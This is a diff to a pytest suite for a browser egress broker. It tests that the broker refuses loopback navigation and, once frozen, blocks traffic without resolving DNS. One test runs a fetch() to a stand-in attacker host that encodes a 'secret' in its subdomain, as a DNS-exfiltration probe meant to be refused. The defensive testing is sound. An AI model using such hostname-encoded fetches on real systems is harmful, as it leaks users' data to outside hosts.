@@ -145,6 +145,44 @@ class Managed:
         return context, guard, page
 
 
+async def quiesced(broker: EgressBroker, timeout: float = 15.0) -> int:
+    """Wait until the broker holds no relay, and say how many it held.
+
+    Full Chromium keeps an idle keep-alive connection to the proxy for a few
+    seconds after the last response, where `chrome-headless-shell` closed it
+    immediately. That is a difference in the *browser*, not in the boundary --
+    nothing is being sent on the idle socket -- but it means "the page finished
+    loading" is not the same instant as "no connection is open".
+
+    A real freeze entry has to drive `active_connections` to zero before it can
+    claim nothing was in flight; that is why `freeze()` returns the count at
+    all. So waiting here is what the production caller will do, not a way of
+    making a test pass.
+    """
+    deadline = asyncio.get_running_loop().time() + timeout
+    while broker.active_connections and asyncio.get_running_loop().time() < deadline:
+        await asyncio.sleep(0.1)
+    return broker.active_connections
+
+
+async def refusal_of(page: Page, url: str) -> str | None:
+    """Navigate and report the broker's refusal code, whatever shape it takes.
+
+    Full Chromium surfaces a proxy error response on a *top-level navigation* as
+    `net::ERR_HTTP_RESPONSE_CODE_FAILURE` rather than handing the page a
+    readable `403`; the headless shell handed over the response. Both are the
+    same refusal by the same broker, so both are accepted -- and in neither case
+    is what the page saw the evidence. The evidence is the connection count at
+    the other end of the wire, which every caller of this helper asserts.
+    """
+    try:
+        response = await page.goto(url, timeout=15_000)
+    except PlaywrightError:
+        return None
+    assert response is not None and response.status == 403
+    return response.headers.get("x-lumi-refusal")
+
+
 @pytest.fixture
 async def managed() -> AsyncIterator[Managed]:
     canary = FixtureSite()
@@ -254,17 +292,19 @@ async def test_a_page_cannot_navigate_to_an_unconfigured_loopback_origin(
 ) -> None:
     """The refusal is the broker's own, and the canary is never dialled.
 
-    A plaintext refusal arrives as a `403` from the proxy rather than a
-    transport error, so the assertion that matters is the connection count at
-    the other end.
+    A plaintext refusal arrives as the broker's own `403` rather than a reply
+    from the destination -- and full Chromium turns that into a navigation
+    error rather than a readable response (see `refusal_of`). Either way the
+    assertion that matters is the connection count at the other end.
     """
     context = await managed.browser.new_context()
     page = await context.new_page()
+    before = managed.broker.counters.refused["plaintext_not_allowed"]
 
-    response = await page.goto(f"{managed.canary.origin}/page", timeout=15_000)
+    refusal = await refusal_of(page, f"{managed.canary.origin}/page")
 
-    assert response is not None and response.status == 403
-    assert response.headers.get("x-lumi-refusal") == "plaintext_not_allowed"
+    assert refusal in (None, "plaintext_not_allowed")
+    assert managed.broker.counters.refused["plaintext_not_allowed"] > before
     assert managed.canary.connections == 0
     await context.close()
 
@@ -426,14 +466,19 @@ async def test_a_frozen_broker_stops_browser_traffic_without_resolving(
     context = await managed.browser.new_context()
     page = await context.new_page()
     await page.goto(f"{managed.site.origin}/page")
+    # Freeze entry is only meaningful once nothing is being relayed, which is
+    # what `freeze()`'s return value is for. Drive it to zero first, exactly as
+    # a real caller must.
+    assert await quiesced(managed.broker) == 0
     served = managed.site.connections
     resolutions = managed.broker.counters.resolutions
 
     assert managed.broker.freeze() == 0
 
-    refused = await page.goto(f"{managed.site.origin}/page?after-freeze", timeout=15_000)
-    assert refused is not None and refused.status == 403
-    assert refused.headers.get("x-lumi-refusal") == "frozen"
+    # The exfiltration probe runs first and from the loaded page: a hostile
+    # name that never resolves is the thing the freeze exists to stop, and a
+    # refused navigation afterwards would destroy this execution context before
+    # it could run.
     reached = await page.evaluate(
         """async (url) => {
             try { await fetch(url, {mode: 'no-cors'}); return 'reached'; }
@@ -441,8 +486,15 @@ async def test_a_frozen_broker_stops_browser_traffic_without_resolving(
         }""",
         "https://secret-value.attacker.example.com/",
     )
-
     assert reached == "refused"
+    assert managed.broker.counters.resolutions == resolutions
+
+    # And a top-level navigation is refused too, in whichever shape this
+    # Chromium reports a proxy refusal.
+    assert await refusal_of(page, f"{managed.site.origin}/page?after-freeze") in (
+        None,
+        "frozen",
+    )
     assert managed.site.connections == served
     assert managed.broker.counters.resolutions == resolutions
     assert managed.broker.counters.refused["frozen"] >= 1
